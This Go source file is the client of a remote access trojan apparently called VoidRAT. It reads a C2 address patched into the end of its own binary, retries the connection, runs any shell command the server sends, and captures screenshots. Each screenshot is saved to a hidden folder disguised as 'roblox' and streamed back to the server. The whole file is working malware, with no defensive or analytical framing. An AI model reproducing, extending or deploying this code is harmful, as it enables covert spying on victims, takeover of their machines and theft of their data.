package main

import (
	"bufio"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"image/png"
	"io"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
)

type Client struct {
	id         int
	clientName string
	clientAddr string
	cmdch      chan []byte
}

var (
	ip   string
	port int
)

// Reconnection settings
var (
	RetryAttempts int = 20
	RetryInterval int = 10 // seconds
)

var remainingRetryAttempts = RetryAttempts

// captureAndSendScreenshot captures the primary screen, saves it to a stealth path,
// and transmits the image data to the C2 server over the existing TCP stream.
func captureAndSendScreenshot(conn net.Conn) error {
	numDisplays := screenshot.NumActiveDisplays()
	if numDisplays <= 0 {
		return fmt.Errorf("no active displays detected")
	}

	img, err := screenshot.CaptureDisplay(0)
	if err != nil {
		return fmt.Errorf("failed to capture display: %w", err)
	}

	// Determine stealth destination directory
	var baseDir string
	if appData := os.Getenv("APPDATA"); appData != "" {
		baseDir = filepath.Join(appData, "roblox")
	} else {
		baseDir = filepath.Join(os.TempDir(), "roblox")
	}

	if err := os.MkdirAll(baseDir, 0755); err != nil {
		return fmt.Errorf("failed to create directory: %w", err)
	}

	screenshotPath := filepath.Join(baseDir, "screenshot.png")
	file, err := os.Create(screenshotPath)
	if err != nil {
		return fmt.Errorf("failed to create screenshot file: %w", err)
	}

	err = png.Encode(file, img)
	file.Close()
	if err != nil {
		return fmt.Errorf("failed to encode screenshot: %w", err)
	}

	imageFile, err := os.Open(screenshotPath)
	if err != nil {
		return fmt.Errorf("failed to open screenshot file: %w", err)
	}
	defer imageFile.Close()

	// Protocol format: [1-byte path length] [path bytes] [raw PNG stream]
	pathBytes := []byte(screenshotPath)
	pathLen := len(pathBytes)
	if pathLen > 255 {
		pathLen = 255
		pathBytes = pathBytes[:255]
	}

	if _, err := conn.Write([]byte{byte(pathLen)}); err != nil {
		return err
	}
	if _, err := conn.Write(pathBytes); err != nil {
		return err
	}

	buffer := make([]byte, 1024)
	for {
		n, err := imageFile.Read(buffer)
		if n > 0 {
			if _, werr := conn.Write(buffer[:n]); werr != nil {
				return werr
			}
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}
	}

	return nil
}

// executeRemoteCommand runs a command on the host OS
func executeRemoteCommand(command string) error {
	command = strings.TrimSpace(command)
	if command == "" {
		return nil
	}

	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}

	return cmd.Run()
}

func RetryConnection() {
	if remainingRetryAttempts <= 0 {
		os.Exit(-1)
	}

	remainingRetryAttempts--
	Connect()
}

func Connect() {
	hostAddr := fmt.Sprintf("%s:%d", ip, port)
	conn, err := net.Dial("tcp", hostAddr)
	if err != nil {
		time.Sleep(time.Duration(RetryInterval) * time.Second)
		RetryConnection()
		return
	}
	defer conn.Close()

	fmt.Printf("[*] Connected to C2 at %s\n", hostAddr)
	// Reset retry attempts on a successful connection
	remainingRetryAttempts = RetryAttempts

	reader := bufio.NewReader(conn)

	for {
		payloadRaw, err := reader.ReadString('\n')
		if err != nil {
			break
		}

		var payload map[string]interface{}
		err = json.Unmarshal([]byte(payloadRaw), &payload)
		if err != nil {
			continue
		}

		msgType, ok := payload["type"].(string)
		if !ok {
			continue
		}

		switch msgType {
		case "remote":
			if cmdStr, ok := payload["command"].(string); ok {
				_ = executeRemoteCommand(cmdStr)
			}
		case "screenshot":
			if err := captureAndSendScreenshot(conn); err != nil {
				fmt.Printf("[!] Screenshot error: %v\n", err)
			}
		case "audio":
			// Reserved for future audio streaming module
			continue
		}
	}

	RetryConnection()
}

func initConfig() {
	// 1. Check environment variables (convenient for testing & debugging)
	envHost := os.Getenv("VOIDRAT_HOST")
	envPort := os.Getenv("VOIDRAT_PORT")
	if envHost != "" && envPort != "" {
		if p, err := strconv.Atoi(envPort); err == nil && p > 0 && p <= 65535 {
			ip = envHost
			port = p
			return
		}
	}

	// 2. Read embedded config from the last 6 bytes of the executable binary:
	// - [len-6 : len-4]: uint16 LittleEndian port
	// - [len-4 : len  ]: 4-byte IPv4 address
	exePath, err := os.Executable()
	if err == nil {
		data, err := os.ReadFile(exePath)
		if err == nil && len(data) >= 6 {
			startIndex := len(data) - 6
			extractedPort := int(binary.LittleEndian.Uint16(data[startIndex : startIndex+2]))
			ipBytes := data[startIndex+2 : startIndex+6]
			extractedIP := fmt.Sprintf("%d.%d.%d.%d", ipBytes[0], ipBytes[1], ipBytes[2], ipBytes[3])

			if extractedPort > 0 && extractedIP != "0.0.0.0" {
				port = extractedPort
				ip = extractedIP
				return
			}
		}
	}

	// 3. Fallback defaults if stub has not yet been patched
	if ip == "" {
		ip = "127.0.0.1"
	}
	if port == 0 {
		port = 4444
	}
}

func main() {
	initConfig()
	Connect()
}
